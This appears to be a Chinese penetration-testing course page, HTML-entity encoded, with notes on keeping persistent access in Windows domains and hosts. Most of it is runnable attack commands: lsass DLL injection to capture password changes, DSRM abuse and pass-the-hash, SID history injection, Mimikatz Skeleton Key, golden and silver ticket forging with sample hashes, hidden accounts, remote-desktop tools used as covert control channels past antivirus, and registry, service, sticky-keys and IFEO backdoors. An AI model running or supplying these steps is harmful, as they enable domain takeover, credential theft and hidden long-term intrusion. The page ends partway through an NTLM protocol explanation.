&#x6280;&#x672F;&#x603B;&#x7ED3;&#xFF1A;
&#x653B;&#x9632;&#x5B9E;&#x6218;&#x4E2D;&#xFF0C;&#x9776;&#x673A;&#x5F88;&#x96BE;&#x4F1A;&#x91CD;&#x542F;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x91CD;&#x542F;&#x7684;&#x8BDD;&#x98CE;&#x9669;&#x8FC7;&#x5927;&#xFF0C;
&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x5728;&#x9776;&#x673A;&#x4E0A;&#x628A;&#x4E24;&#x4E2A;&#x65B9;&#x6CD5;&#x76F8;&#x4E92;&#x7ED3;&#x5408;&#x8D77;&#x6765;&#x4F7F;&#x7528;&#x6548;&#x679C;&#x6BD4;&#x8F83;&#x597D;&#xFF0C;
&#x5C1D;&#x8BD5;&#x5229;&#x7528;&#x628A;&#x751F;&#x6210;&#x7684;&#x65E5;&#x5FD7;&#x5BC6;&#x7801;&#x6587;&#x4EF6;&#x53D1;&#x9001;&#x5230;&#x5185;&#x7F51;&#x88AB;&#x63A7;&#x673A;&#x5668;&#x6216;&#x8005;&#x4E34;&#x65F6;&#x90AE;&#x7BB1;&#x3002;

#&#x5185;&#x7F51;&#x57DF;-&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57FA;&#x4E8E;&#x9A8C;&#x8BC1;DLL&#x52A0;&#x8F7D;-HOOK
https://github.com/wh0Nsq/HookPasswordChange
https://github.com/clymb3r/Misc-Windows-Hacking
&#x65B9;&#x6CD5;&#x4E00;&#x3001;
powershell
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
&#x65B9;&#x6CD5;&#x4E8C;&#x3001;
powershell -exec bypass -Command &quot;&amp; {Import-Module &apos;C:\Invoke-ReflectivePEInjection.ps1&apos;;Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll -procname lsass}&quot;
&#x62A5;&#x9519;&#x89E3;&#x51B3;&#xFF1A;
powershell
Set-ExecutionPolicy
unrestricted

#&#x5185;&#x7F51;&#x57DF;-&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57FA;&#x4E8E;&#x673A;&#x5236;&#x8D26;&#x53F7;&#x542F;&#x7528;-DSRM
1.&#x83B7;&#x53D6;dsrm&#x53CA;krbtgt&#x7684;NTLM hash
privilege::debug
lsadump::lsa /patch /name:krbtgt
token::elevate
lsadump::sam
2.dsrm&amp;krbtgt&amp;NTLM hash&#x540C;&#x6B65;
NTDSUTIL&#xFF1A;&#x6253;&#x5F00;ntdsutil
set DSRM password&#xFF1A;&#x4FEE;&#x6539;DSRM&#x7684;&#x5BC6;&#x7801;
sync from domain account &#x57DF;&#x7528;&#x6237;&#x540D;&#x5B57;&#xFF1A;&#x4F7F;DSRM&#x7684;&#x5BC6;&#x7801;&#x548C;&#x6307;&#x5B9A;&#x57DF;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x540C;&#x6B65;
q(&#x7B2C;1&#x6B21;)&#xFF1A;&#x9000;&#x51FA;DSRM&#x5BC6;&#x7801;&#x8BBE;&#x7F6E;&#x6A21;&#x5F0F;
q(&#x7B2C;2&#x6B21;)&#xFF1A;&#x9000;&#x51FA;ntdsutil
3.&#x4FEE;&#x6539;dsrm&#x767B;&#x5F55;&#x65B9;&#x5F0F;
New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD
4.&#x5229;&#x7528;PTH&#x4F20;&#x9012;&#x653B;&#x51FB;
privilege::debug
sekurlsa::pth /domain:owa2010cn-god /user:administrator /ntlm:b097d7ed97495408e1537f706c357fc5
dir \\owa2010cn-god\c$
&#x6280;&#x672F;&#x603B;&#x7ED3;&#xFF1A;
&#x5229;&#x7528;&#x7CFB;&#x7EDF;&#x81EA;&#x5E26;&#x673A;&#x5236;&#x6A21;&#x5F0F;DSRM&#xFF0C;&#x4FEE;&#x6539;DSRM&#x9ED8;&#x8BA4;&#x767B;&#x5F55;&#x65B9;&#x5F0F;&#x548C;&#x5C5E;&#x6027;&#xFF0C;&#x901A;&#x8FC7;&#x5176;&#x540C;&#x6B65;krgtgt&#x8FDB;&#x884C;PTH&#x653B;&#x51FB;&#xFF0C;&#x5B9E;&#x73B0;&#x6301;&#x7EED;&#x5316;&#x63A7;&#x5236;&#xFF0C;&#x4F46;&#x9002;&#x7528;&#x4E8E;&#x7CFB;&#x7EDF;=&gt;windows server2008&#x3002;&#x6BCF;&#x4E2A;&#x57DF;&#x63A7;&#x5236;&#x5668;&#x90FD;&#x6709;&#x672C;&#x5730;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x53F7;&#x548C;&#x5BC6;&#x7801;&#xFF08;&#x4E0E;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x53F7;&#x548C;&#x5BC6;&#x7801;&#x4E0D;&#x540C;&#xFF09;&#x3002;DSRM&#x8D26;&#x53F7;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x57DF;&#x63A7;&#x5236;&#x5668;&#x7684;&#x672C;&#x5730;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#xFF0C;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x57DF;&#x63A7;&#x5236;&#x5668;&#xFF0C;&#x8FDB;&#x800C;&#x63A7;&#x5236;&#x57DF;&#x63A7;&#x5236;&#x5668;&#x3002;

#&#x5185;&#x7F51;&#x57DF;-&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57FA;&#x4E8E;&#x7528;&#x6237;&#x5C5E;&#x6027;&#x4FEE;&#x6539;-SID history
1&#x3001;&#x83B7;&#x53D6;&#x67D0;&#x7528;&#x6237;SID&#x5C5E;&#x6027;&#xFF1A;
Import-Module ActiveDirectory
Get-ADUser webadmin -Properties sidhistory
2&#x3001;&#x7ED9;&#x4E88;&#x67D0;&#x7528;&#x6237;administrator&#x5C5E;&#x6027;&#xFF1A;
privilege::debug
sid::patch
sid::add /sam:webadmin /new:administrator
3&#x3001;&#x6D4B;&#x8BC4;&#x7ED9;&#x4E0E;&#x524D;&#x540E;&#x7684;DC&#x8BBF;&#x95EE;&#x6743;&#x9650;&#xFF1A;
dir \\192.168.3.21\c$
&#x6280;&#x672F;&#x603B;&#x7ED3;&#xFF1A;
&#x628A;&#x57DF;&#x63A7;&#x7BA1;&#x7406;&#x5458;&#x7684;SID&#x52A0;&#x5165;&#x5230; &#x5176;&#x4ED6;&#x67D0;&#x4E2A; &#x6076;&#x610F;&#x7684;&#x57DF;&#x8D26;&#x6237;&#x7684;SID History&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#xFF0C;&#x8FD9;&#x4E2A;&#x6076;&#x610F;&#x7684;&#xFF08;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;&#x7684;&#xFF09;&#x57DF;&#x8D26;&#x6237;&#x5C31;&#x53EF;&#x4EE5;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#x8BBF;&#x95EE;&#x57DF;&#x63A7;&#x4E86;&#xFF0C;&#x4E0D;&#x4FEE;&#x6539;&#x57DF;&#x8D26;&#x6237;&#x4E00;&#x76F4;&#x5B58;&#x5728;&#x3002;

#&#x5185;&#x7F51;&#x57DF;-&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57FA;&#x4E8E;&#x767B;&#x5F55;&#x8FDB;&#x7A0B;&#x52AB;&#x6301;-Skeleton Key
1&#x3001;&#x6D4B;&#x8BD5;&#x57DF;&#x5185;&#x67D0;&#x4E2A;&#x7528;&#x6237;&#x4E0E;DC&#x901A;&#x8BAF;
dir \\owa2010cn-god\c$
2&#x3001;&#x8FDE;&#x63A5;DC&#x540E;&#xFF0C;DC&#x6CE8;&#x5165;lsass&#x8FDB;&#x7A0B;
net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god\administrator
mimikatz&#xFF1A;
privilege::debug
misc::skeleton
3&#x3001;&#x91CD;&#x65B0;&#x6D4B;&#x8BD5;&#x57DF;&#x5185;&#x67D0;&#x4E2A;&#x7528;&#x6237;&#x4E0E;DC&#x901A;&#x8BAF;
net use \\owa2010cn-god\ipc$ &quot;mimikatz&quot; /user:god\administrator
dir \\owa2010cn-god\c$
&#x6280;&#x672F;&#x603B;&#x7ED3;&#xFF1A;
&#x56E0;&#x4E3A;Skeleton Key&#x6280;&#x672F;&#x662F;&#x88AB;&#x6CE8;&#x5165;&#x5230;lsass.exe&#x8FDB;&#x7A0B;&#x7684;&#xFF0C;
&#x6240;&#x4EE5;&#x5B83;&#x53EA;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x5982;&#x57DF;&#x63A7;&#x91CD;&#x542F;&#xFF0C;&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x5C06;&#x5931;&#x6548;&#x3002;
</code></pre><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/89918/28/34759/21959/64817111F876cefc3/60901559f0df4b70.jpg" alt="image.png"></p>
<pre><code>1.&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57FA;&#x4E8E;&#x7528;&#x6237;-&#x9690;&#x85CF;&#x7528;&#x6237;
https://github.com/wgpsec/CreateHiddenAccount
CreateHiddenAccount -u xiaodi -p Xiaodi!@#45
&#x63A7;&#x5236;&#x9762;&#x677F;&#x80FD;&#x67E5;&#x770B;&#x5230;&#xFF0C;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x770B;&#x4E0D;&#x5230;&#xFF0C;&#x5355;&#x673A;&#x7248;&#x65E0;&#x6CD5;&#x5220;&#x9664;&#xFF0C;&#x57DF;&#x73AF;&#x5883;&#x53EF;&#x4EE5;&#x5220;&#x9664;



2.&#x57FA;&#x4E8E;&#x8F6F;&#x4EF6;-GotoHTTP&amp;RustDesk
C2 GotoHTTP
https://gotohttp.com/goto/download.12x
&#x65E0;&#x7F51;&#x7EDC;&#xFF08;1&#x3001;&#x538B;&#x6839;&#x6CA1;&#x6709;&#x7F51;&#x7EDC;&#xFF0C;2&#x3001;&#x9650;&#x5236;&#x51FA;&#x7F51;&#xFF09;
1&#x3001;&#x6709;&#x7F51;&#x7EDC;&#xFF0C;&#x65E0;&#x9650;&#x5236;
2&#x3001;&#x6709;&#x7F51;&#x7EDC;&#xFF0C;&#x6709;&#x9650;&#x5236;&#xFF08;&#x4E0D;&#x9650;&#x5236;https&#x5C31;&#x53EF;&#x4EE5;&#xFF09;
3&#x3001;&#x65E0;&#x7F51;&#x7EDC;&#xFF0C;&#x6709;&#x9650;&#x5236;&#xFF08;&#x4E0D;&#x9650;&#x5236;https&#x5C31;&#x53EF;&#x4EE5;&#xFF09;
&#x5229;&#x7528;&#x573A;&#x666F;&#xFF1A;&#x6709;&#x7F51;&#x7EDC;&#x4E0B;&#xFF0C;&#x9700;&#x8981;&#x7ED5;&#x8FC7;&#x6740;&#x6BD2;&#x7B49;&#x7F51;&#x7EDC;&#x9632;&#x62A4;
B2C&#x6A21;&#x5F0F;&#xFF0C;&#x65E0;&#x9700;&#x5B89;&#x88C5;&#x63A7;&#x5236;&#x7AEF;&#x8F6F;&#x4EF6;&#xFF0C;&#x6709;&#x6D4F;&#x89C8;&#x5668;&#x5C31;&#x53EF;&#x4EE5;&#x8FDC;&#x63A7;&#x3002;
&#x6D41;&#x91CF;&#x8D70;https&#x534F;&#x8BAE;&#xFF0C;&#x53EA;&#x8981;&#x76EE;&#x6807;&#x653E;&#x884C;443&#x7AEF;&#x53E3;&#x51FA;&#x53E3;&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5185;&#x7F51;&#x7A7F;&#x900F;&#x3002;
&#x5728;&#x4F4E;&#x5E26;&#x5BBD;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;&#x8FD0;&#x884C;&#x5360;&#x7528;&#x5185;&#x5B58;&#x6781;&#x4F4E;&#xFF0C;&#x63A7;&#x5236;&#x65F6;&#x5360;&#x7528;CPU&#x4EC5;&#x4E3A;0%-3%&#x3002;
&#x88AB;&#x63A7;&#x7AEF;&#x5728;&#x7C7B;Linux&#x7CFB;&#x7EDF;&#x4E0A;&#x652F;&#x6301;&#x56FE;&#x5F62;&#x754C;&#x9762;&#xFF08;GUI&#xFF09;&#x548C;&#x5B57;&#x7B26;&#x754C;&#x9762;&#xFF08;CLI&#xFF09;&#x3002;
&#x7F51;&#x7EDC;&#x5524;&#x9192;&#x8FDC;&#x7A0B;&#x4E3B;&#x673A;&#x9700;&#x52A0;&#x8F7D;&#x9A71;&#x52A8;&#xFF0C;&#x5BFC;&#x81F4;&#x8FD0;&#x884C;&#x65F6;&#x5B89;&#x5168;&#x536B;&#x58EB;&#x4F1A;&#x62E6;&#x622A;&#x8FD9;&#x884C;&#x4E3A;&#xFF0C;&#x5176;&#x4ED6;&#x6740;&#x8F6F;&#x4E0D;&#x4F1A;&#x62E6;&#x622A;&#x3002;

C2 RustDesk
https://github.com/rustdesk/rustdesk
&#x5229;&#x7528;&#x573A;&#x666F;&#xFF1A;&#x65E0;&#x9700;&#x7F51;&#x7EDC;&#xFF0C;&#x9700;&#x8981;&#x7ED5;&#x8FC7;&#x6740;&#x6BD2;&#x7B49;&#x7F51;&#x7EDC;&#x9632;&#x62A4;
1&#x3001;&#x6709;&#x7F51;&#x8FDE;&#x63A5;&#xFF1A;
C:\Users\&#x7528;&#x6237;&#x540D;\AppData\Roaming\RustDesk\config
&#x5176;&#x4E2D;ID&#x548C;&#x5BC6;&#x7801;&#x5728;RustDesk.toml&#x6587;&#x4EF6;&#x91CC;&#x3002;
2&#x3001;&#x65E0;&#x7F51;&#x5185;&#x7F51;&#x8FDE;&#x63A5;&#xFF1A;IP&#x76F4;&#x8FDE;
RustDesk2.toml
direct-server = &apos;Y&apos;
direct-access-port = &apos;8443&apos;


3.&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57FA;&#x4E8E;&#x670D;&#x52A1;TGT-&#x9EC4;&#x91D1;&#x767D;&#x94F6;&#x7968;&#x636E;
&#x2EE9;&#x2FA6;&#x7968;&#x636E;&#x2F63;&#x6210;&#x653B;&#x51FB;&#xFF0C;&#x662F;&#x2F63;&#x6210;&#x6709;&#x6548;&#x7684;TGT Kerberos&#x7968;&#x636E;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x53D7;TGT&#x2F63;&#x547D;&#x5468;&#x671F;&#x7684;&#x5F71;&#x54CD;&#xFF08;TGT&#x9ED8;&#x8BA4;10&#x2F29;&#x65F6;&#xFF0C;&#x6700;&#x591A;&#x7EED;&#x8BA2;7&#x5929;&#xFF09;&#xFF0C;&#x8FD9;&#x2FA5;&#x53EF;&#x4EE5;&#x4E3A;&#x4EFB;&#x610F;&#x2F64;&#x6237;&#x2F63;&#x6210;&#x2EE9;&#x2FA6;&#x7968;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x4E3A;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x2F63;&#x6210;TGT&#xFF0C;&#x8FD9;&#x6837;&#x666E;&#x901A;&#x2F64;&#x6237;&#x5C31;&#x53EF;&#x4EE5;&#x53D8;&#x6210;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x3002;
&#x767D;&#x94F6;&#x7968;&#x636E;&#xFF08;SILVER TICKET&#xFF09;&#x662F;&#x5229;&#x7528;&#x57DF;&#x7684;&#x670D;&#x52A1;&#x8D26;&#x6237;&#x8FDB;&#x884C;&#x4F2A;&#x9020;&#x7684;ST&#xFF0C;&#x5728;Kerberos&#x8BA4;&#x8BC1;&#x7684;&#x7B2C;&#x4E09;&#x6B65;&#xFF0C;Client&#x5E26;&#x7740;ST&#x548C;Authenticator3&#x5411;Server&#x4E0A;&#x7684;&#x67D0;&#x4E2A;&#x670D;&#x52A1;&#x8FDB;&#x884C;&#x8BF7;&#x6C42;&#xFF0C;Server&#x63A5;&#x6536;&#x5230;Client&#x7684;&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x81EA;&#x5DF1;&#x7684;Master Key &#x89E3;&#x5BC6;ST&#xFF0C;&#x4ECE;&#x800C;&#x83B7;&#x5F97; Session Key&#x3002;&#x6240;&#x4EE5;&#x53EA;&#x9700;&#x8981;&#x77E5;&#x9053;Server&#x7528;&#x6237;&#x7684;Hash&#x5C31;&#x53EF;&#x4EE5;&#x4F2A;&#x9020;&#x51FA;&#x4E00;&#x4E2A;ST&#xFF0C;&#x4E14;&#x4E0D;&#x4F1A;&#x7ECF;&#x8FC7;KDC&#xFF0C;&#x4F46;&#x662F;&#x4F2A;&#x9020;&#x7684;&#x95E8;&#x7968;&#x53EA;&#x5BF9;&#x90E8;&#x5206;&#x670D;&#x52A1;&#x8D77;&#x4F5C;&#x7528;&#xFF08;&#x4E0D;&#x9700;&#x8981;&#x4EA4;&#x4E92;KDC&#xFF0C;&#x9700;&#x8981;&#x77E5;&#x9053;Server&#x7684;NTLM Hash&#xFF09;&#x3002;

&#x9EC4;&#x91D1;&#x65B9;&#x6CD5;&#xFF1A;
1&#x3001;&#x5DF2;&#x7ECF;&#x62FF;&#x4E0B;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x83B7;&#x53D6;&#x5230;krbtgt hash&#xFF1B;
2&#x3001;&#x5229;&#x7528;krbtgt&#x7684;hash&#x5236;&#x4F5C;&#x9EC4;&#x91D1;&#x7968;&#x636E;&#x5DE5;&#x5177;&#xFF0C;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#x3002;
&#x6D41;&#x7A0B;&#xFF1A;
1&#x3001;&#x57DF;&#x540D;&#xFF1A;god.org
2&#x3001;&#x57DF;&#x7684;SID&#x503C;&#xFF1A;S-1-5-21-1218902331-2157346161-1782232778
&gt;whoami /user
&gt;whoami /all
&gt;wmic useraccount get name,sid
3&#x3001;&#x57DF;&#x7684;KRBTGT&#x8D26;&#x6237;NTLM-HASH&#xFF1A;b097d7ed97495408e1537f706c357fc5
&gt;mimikatz privilege::debug
&gt;mimikatz lsadump::lsa /patch
4&#x3001;&#x4F2A;&#x9020;&#x7528;&#x6237;&#x540D;&#xFF1A;webadmin&#xFF08;&#x4EFB;&#x610F;&#x7528;&#x6237;&#x540D;&#xFF09;
&#x751F;&#x6210;&#x7968;&#x636E;&#xFF1A;
mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:g
&#x5BFC;&#x5165;&#x5185;&#x5B58;&#xFF1A;
mimikatz kerberos::ptt g
&#x8BBF;&#x95EE;&#x6D4B;&#x8BD5;&#xFF1A;
dir \\owa2010cn-god\c$
&#x540E;&#x671F;&#x6E17;&#x900F;&#xFF1A;&#x7ED3;&#x5408;&#x524D;&#x9762;&#x7684;&#x8BFE;&#x7A0B;
net use \\owa2010cn-god
&#x9EC4;&#x91D1;&#x7968;&#x636E;&#x603B;&#x7ED3;&#xFF1A;
&#x8BE5;&#x653B;&#x51FB;&#x2F45;&#x5F0F;&#x5176;&#x5B9E;&#x662F;&#x2F00;&#x79CD;&#x540E;&#x2ED4;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x5C5E;&#x4E8E;&#x7B2C;&#x2F06;&#x6B21;&#x8FDB;&#x2F8F;&#x653B;&#x51FB;&#x7684;&#x2F45;&#x6CD5;&#x3002;
&#x7B2C;&#x2F00;&#x6B21;&#x62FF;&#x5230;&#x57DF;&#x7BA1;&#x6743;&#x9650;&#x4E4B;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5C06;krbtgt NTLM hash&#x8FDB;&#x2F8F;&#x4FDD;&#x5B58;&#xFF0C;&#x5F53;&#x7B2C;&#x2F06;&#x6B21;&#x518D;&#x6765;&#x8FDB;&#x2F8F;&#x57DF;&#x6E17;&#x900F;&#x653B;&#x51FB;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4F7F;&#x2F64;krbtgt&#x7684;NTLM hash&#x5236;&#x4F5C;&#x2EE9;&#x2FA6;&#x7968;&#x636E;&#xFF0C;&#x4ECE;&#x2F7D;&#x518D;&#x6B21;&#x83B7;&#x5F97;&#x57DF;&#x7BA1;&#x6743;&#x9650;&#x3002;

&#x767D;&#x94F6;&#x65B9;&#x6CD5;&#xFF1A;
1&#x3001;&#x5DF2;&#x7ECF;&#x62FF;&#x4E0B;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x83B7;&#x53D6;&#x5230;DC hash&#xFF1B;
2&#x3001;&#x5229;&#x7528;DC&#x7684;hash&#x5236;&#x4F5C;&#x767D;&#x94F6;&#x7968;&#x636E;&#x5DE5;&#x5177;&#xFF0C;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#x3002;
&#x6D41;&#x7A0B;&#xFF1A;
1&#x3001;&#x57DF;&#x540D;&#xFF1A;god.org
2&#x3001;&#x57DF;&#x7684;SID&#x503C;&#xFF1A;S-1-5-21-1218902331-2157346161-1782232778
&gt;whoami /user
&gt;whoami /all
&gt;wmic useraccount get name,sid
3&#x3001;&#x57DF;DC&#x8D26;&#x6237;NTLM-HASH&#xFF1A;82779569ef27d72b88b6c93dd8b37299
&gt;mimikatz privilege::debug
&gt;mimikatz sekurlsa::logonpasswords
4&#x3001;&#x4F2A;&#x9020;&#x7528;&#x6237;&#x540D;&#xFF1A;webadmin&#xFF08;&#x4EFB;&#x610F;&#x7528;&#x6237;&#x540D;&#xFF09;
&#x5BFC;&#x5165;&#x7968;&#x636E;&#xFF1A;&#xFF08;CIFS&#x6587;&#x4EF6;&#x5171;&#x4EAB;&#x670D;&#x52A1;&#xFF09;
domain&#xFF1A;&#x57DF;&#x540D;
sid&#xFF1A;&#x57DF;&#x73AF;&#x5883;&#x4E0B;&#x7684;SID&#xFF0C;&#x9664;&#x53BB;&#x6700;&#x540E;-&#x7684;&#x90E8;&#x5206;&#x5269;&#x4E0B;&#x7684;&#x5185;&#x5BB9;
target&#xFF1A;&#x8981;&#x8BBF;&#x95EE;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5199;FQDN
rc4&#xFF1A;&#x5199;&#x7684;&#x662F;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;NTLM&#xFF08;&#x4E3B;&#x673A;&#x540D;$&#x5BF9;&#x5E94;NTLM&#xFF09;
service&#xFF1A;&#x8981;&#x8BBF;&#x95EE;&#x7684;&#x8D44;&#x6E90;&#x7C7B;&#x578B;
user&#xFF1A;&#x4F2A;&#x9020;&#x7684;&#x7528;&#x6237;
cifs&#xFF1A;&#x5171;&#x4EAB;&#x6587;&#x4EF6;
mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:owa2010cn-god /service:cifs /rc4:82779569ef27d72b88b6c93dd8b37299 /ptt
&#x767D;&#x94F6;&#x7968;&#x636E;&#x603B;&#x7ED3;
1&#x3001;&#x4F2A;&#x9020;&#x7684;ST&#xFF0C;&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x6307;&#x5B9A;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x5982;CIFS&#xFF1B;
2&#x3001;&#x4E0D;&#x4E0E;KDC&#x4EA4;&#x4E92;&#xFF0C;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;Server&#xFF1B;
3&#x3001;ST&#x7531;&#x670D;&#x52A1;&#x8D26;&#x53F7; NTLM Hash &#x52A0;&#x5BC6;&#x3002;
</code></pre><pre><code>#&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57DF;&#x73AF;&#x5883;&amp;&#x5355;&#x673A;&#x7248;-&#x81EA;&#x542F;&#x52A8;
1&#x3001;&#x81EA;&#x542F;&#x52A8;&#x8DEF;&#x5F84;&#x52A0;&#x8F7D;
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
2&#x3001;&#x81EA;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x52A0;&#x8F7D;
sc create ServiceTest binPath= C:\xd.exe  start= auto
sc delete ServiceTest
3&#x3001;&#x81EA;&#x542F;&#x52A8;&#x6CE8;&#x518C;&#x8868;&#x52A0;&#x8F7D;
-&#x5F53;&#x524D;&#x7528;&#x6237;&#x952E;&#x503C;
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
-&#x670D;&#x52A1;&#x5668;&#x952E;&#x503C;&#xFF08;&#x9700;&#x8981;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#xFF09;
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 
-&#x6DFB;&#x52A0;&#x542F;&#x52A8;&#x9879;
REG ADD &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;backdoor&quot; /t REG_SZ /F /D &quot;C:\xd.exe&quot;
4&#x3001;&#x8BA1;&#x5212;&#x8BA1;&#x65F6;&#x4EFB;&#x52A1;
&#x53C2;&#x8003;&#x524D;&#x9762;&#x6A2A;&#x5411;&#x79FB;&#x52A8;&#x8BFE;&#x7A0B;

#&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57DF;&#x73AF;&#x5883;&amp;&#x5355;&#x673A;&#x7248;-&#x7C98;&#x6EDE;&#x952E;
&#x7CFB;&#x7EDF;&#x81EA;&#x5E26;&#x7684;&#x8F85;&#x52A9;&#x529F;&#x80FD;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#x6267;&#x884C;&#xFF0C;&#x653E;&#x5927;&#x955C;&#xFF0C;&#x65C1;&#x767D;&#xFF0C;&#x5C4F;&#x5E55;&#x952E;&#x76D8;&#x7B49;&#x5747;&#x53EF;&#x3002;
&#x7C98;&#x6EDE;&#x952E;&#x4F4D;&#x7F6E;&#xFF1A;
c:\windows\system32\sethc.exe
move sethc.exe sethc1.exe
copy cmd.exe sethc.exe

#&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57DF;&#x73AF;&#x5883;&amp;&#x5355;&#x673A;&#x7248;-&#x6620;&#x50CF;&#x52AB;&#x6301;
&#x6D4B;&#x8BD5;&#xFF1A;&#x6267;&#x884C;notepad&#x6210;cmd
REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe /c calc&quot;
&#x914D;&#x5408;GlobalFlag&#x9690;&#x85CF;&#xFF1A;&#x6267;&#x884C;&#x6B63;&#x5E38;&#x5173;&#x95ED;&#x540E;&#x89E6;&#x53D1;
reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512
reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1
reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\xd.exe&quot;

#&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57DF;&#x73AF;&#x5883;&amp;&#x5355;&#x673A;&#x7248;-&#x5C4F;&#x4FDD;&amp;&#x767B;&#x5F55;
1&#x3001;WinLogon&#x914D;&#x5408;&#x65E0;&#x6587;&#x4EF6;&#x843D;&#x5730;&#x4E0A;&#x7EBF;
REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /V &quot;Userinit&quot; /t REG_SZ /F /D &quot;C:\xd.exe&quot;
2&#x3001;&#x5C4F;&#x5E55;&#x4FDD;&#x62A4;&#x751F;&#x6548;&#x540E;&#x6267;&#x884C;&#x540E;&#x95E8;
reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\xd.exe&quot; /f
</code></pre><h3 id="ntlm&#x534F;&#x8BAE;--kerberos&#x534F;&#x8BAE;">NTLM&#x534F;&#x8BAE; + Kerberos&#x534F;&#x8BAE;</h3>
<h5 id="ntlm&#x534F;&#x8BAE;">NTLM&#x534F;&#x8BAE;</h5>
<p>&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
<p>1&#xFF09;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x7AEF;&#x53D1;&#x9001;&#x7528;&#x6237;&#x540D;&#x7B49;&#x4FE1;&#x606F;</p>
<p>2&#xFF09;&#x670D;&#x52A1;&#x7AEF;&#x6536;&#x5230;&#x540E;&#x4F7F;&#x7528;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D;&#x5BF9;&#x5E94;&#x7684;NTLM hash&#x52A0;&#x5BC6;challenge&#xFF08;16&#x4F4D;&#x968F;&#x673A;&#x5B57;&#x7B26;&#xFF09;</p>
<p>3&#xFF09;&#x670D;&#x52A1;&#x7AEF;&#x518D;&#x5C06;&#x8FD9;&#x4E2A;challenge&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;</p>
